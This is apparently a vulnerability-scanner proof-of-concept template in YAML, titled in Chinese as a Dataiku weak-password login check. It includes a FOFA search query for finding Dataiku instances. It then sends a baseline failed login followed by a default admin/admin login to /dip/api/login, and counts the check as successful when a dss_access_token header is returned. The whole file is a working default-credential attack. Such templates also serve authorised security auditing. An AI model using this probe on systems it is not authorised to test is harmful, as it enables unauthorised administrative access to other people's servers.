id: poc-yaml-dataiku-weak-password-login
info:
  name: dataiku 弱口令登录漏洞
  severity: high
  tags:
  - 弱口令
  finger: dataiku
  fofa: title="dataiku"
requests:
- method: POST
  path: /dip/api/login
  headers:
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  data: login=asdadw&password=asdawdad
  expression: status_code == 401 && contains(body,"Authentication failed.")
- method: POST
  path: /dip/api/login
  headers:
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  data: login=admin&password=admin
  expression: status_code == 200 && contains(headers,"dss_access_token") && body ==
    ""
variables: {}
transport: http
